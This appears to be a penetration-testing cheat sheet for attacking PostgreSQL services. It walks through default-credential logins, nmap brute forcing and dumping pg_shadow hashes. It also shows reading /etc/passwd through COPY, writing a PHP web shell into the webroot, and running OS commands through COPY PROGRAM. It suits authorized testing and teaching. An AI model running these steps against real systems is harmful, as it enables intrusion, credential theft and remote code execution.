# PostgreSQL (5432)

!!! tip "Start here"
    Try connecting as `postgres` with no password: `psql -h $IP -U postgres`. Many installs use `postgres:postgres` or trust authentication for local-equivalent connections. If you get in, check if `COPY` is available, it gives you file read and write on the host OS.

---

## Enumeration

```bash
nmap -sV -p 5432 $IP
```

---

## Authentication

```bash
psql -h $IP -U postgres
psql -h $IP -U postgres -W
```

Common credentials: `postgres:postgres`, `postgres:admin`, `admin:admin`

---

## Brute Force

```bash
nmap -p 5432 --script pgsql-brute \
  --script-args 'userdb=users.txt,passdb=passwords.txt,brute.guesses=3' $IP
```

Adjust `brute.guesses` to remain below the approved attempt limit.

---

## Enumeration Queries

```sql
\list
\c DATABASE_NAME
\dt
SELECT version();
SELECT current_user;
SELECT usename, passwd FROM pg_shadow;
```

The first three lines are `psql` meta-commands for listing databases, changing databases, and listing relations. Reading `pg_shadow` requires elevated privileges.

---

## File Read / Write (COPY)

Server-side file operations require superuser or the relevant predefined role: `pg_read_server_files` for reads and `pg_write_server_files` for writes. Paths and permissions are evaluated as the PostgreSQL operating-system account.

Read a file from the host:

```sql
CREATE TABLE tmp (content TEXT);
COPY tmp FROM '/etc/passwd';
SELECT * FROM tmp;
```

Write a file to disk:

```sql
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

---

## OS Command Execution (COPY TO/FROM PROGRAM)

`COPY ... PROGRAM` is available in PostgreSQL 9.3+ but requires superuser or membership in `pg_execute_server_program`:

```sql
COPY (SELECT '') TO PROGRAM 'id > /tmp/pg-copy-program.txt';
COPY tmp FROM PROGRAM 'id';
SELECT * FROM tmp;
```

---

## Privilege Check

```sql
SELECT current_user, usesuper FROM pg_user WHERE usename = current_user;
SELECT rolname FROM pg_roles
WHERE pg_has_role(current_user, oid, 'member')
  AND rolname IN ('pg_read_server_files','pg_write_server_files','pg_execute_server_program');
```
